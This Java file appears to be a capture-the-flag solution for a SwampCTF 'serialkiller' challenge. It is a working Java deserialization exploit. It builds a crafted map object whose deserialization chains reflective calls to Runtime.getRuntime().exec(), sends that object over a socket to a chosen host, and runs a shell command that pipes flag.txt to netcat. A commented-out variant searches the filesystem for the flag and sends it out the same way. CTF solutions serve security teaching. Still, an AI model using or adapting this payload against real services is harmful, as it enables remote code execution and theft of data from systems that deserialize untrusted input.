package com.swampctf.serialkiller;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.Base64;
import java.util.HashMap;

public class Solution {

	public static void main(String[] args) {
		/*
		 * This idea was used to create the problem
		 *
		 * Idea here is to use Map<methodName, arguments>
		 *
		 * take entry.getKey() from map entry and use it as a method name, and
		 * take entry.getValue() as arguments to method we got in key of entry.
		 * Using this we can create chain of method calls if there are multiple
		 * key, value pairs.
		 *
		 * To trigger the chain, while deserializing the map setValue will be called
		 * and a vulnerability will be added, to keep invoking method with args as described
		 * earlier and state of chain will be maintained in the vulnerability
		 *
		 * Constructor will allow to initialize the gunPowederClazz with class
		 * "java.lang.Runtime" and next calls to setValue during deserialization
		 * gives the opportunity to make a chain till getRuntime().exec()
		 *
		 */

		/**
		 * Solution:
		 *
		 * 1. Create a map of SerialKillersMap with gunPowder as "java.lang.Runtime"
		 * 2. then create a chain by passing key(method name): value (arguments)
		 * 		getRuntime: null
		 * 			exec(): "any command to run" in base64 encoded form
		 * 3. Serialize the map and send it to server
		 */
		String host = null;
		int port = -1;
		if (args.length != 2) {
			System.out.println("Specify the target's ip address and port to connect");
			System.exit(1);
		} else {
			host = args[0];
			port = Integer.parseInt(args[1]);
		}
		Socket clientSocket = null;
		ObjectOutputStream oos = null;

		System.out.println("Yeet");
		String exec_args[] = new String[] {"/bin/sh", "-c", "cat flag.txt | nc localhost 60000"};
		//exec_args = new String[] {"/bin/sh", "-c", "find / -name \"flag.txt\" 2>/dev/null | nc localhost 60000"};

		try {
			clientSocket = new Socket(host, port);
			System.out.println(String.format("Connected to server %s on port %d", host, port));
			oos = new ObjectOutputStream(clientSocket.getOutputStream());
			oos.flush();
			SerialKillersMap skmap = new SerialKillersMap(new HashMap<>(), "java.lang.Runtime");
			skmap.put("getRuntime", null);
			skmap.put("exec", exec_args);
			oos.writeObject(skmap);
			oos.flush();
			//oos.close();
			System.out.println("serialized data written.");
			while (true) {
			System.out.println(new BufferedReader(new InputStreamReader(clientSocket.getInputStream())).readLine());
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
